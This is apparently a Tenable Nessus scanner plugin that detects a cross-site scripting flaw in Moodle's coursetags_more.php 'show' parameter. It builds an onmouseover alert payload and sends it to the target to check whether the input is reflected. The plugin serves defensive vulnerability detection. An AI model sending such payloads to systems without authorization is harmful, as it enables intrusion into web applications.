#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(58907);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/01/23 22:03:56 $");

  script_bugtraq_id(46646);
  script_osvdb_id(75060);

  script_name(english:"Moodle MSA-11-0007 'coursetags_more.php' XSS");
  script_summary(english:"Attempts to exploit an XSS flaw in the 'show' parameter of Moodle.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is vulnerable to a
cross-site scripting attack.");
  script_set_attribute(attribute:"description", value:
"The remote web server is hosting a version of Moodle that is affected
by a cross-site scripting vulnerability in the 'show' parameter of the
'tag/coursetags_more.php' script.");
  script_set_attribute(attribute:"see_also", value:"http://moodle.org/mod/forum/discuss.php?d=170008");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.0.2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/03/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/03/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/04/27");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:moodle:moodle");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencie("moodle_detect.nasl");
  script_require_keys("www/PHP", "installed_sw/Moodle");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("install_func.inc");

app = "Moodle";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

xss = 'community" onmouseover="alert(/'+SCRIPT_NAME + '-' + unixtime() + '/);">';
expected_output = 'tag/coursetags_more.php?show='+xss;

exploited = test_cgi_xss(
  port     : port,
  dirs     : make_list(dir),
  cgi      : "/tag/coursetags_more.php",
  qs       : "show="+urlencode(str:xss),
  pass_str : expected_output,
  ctrl_re  : 'Order:<b>Alphabetical</b>'
);

if (!exploited) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
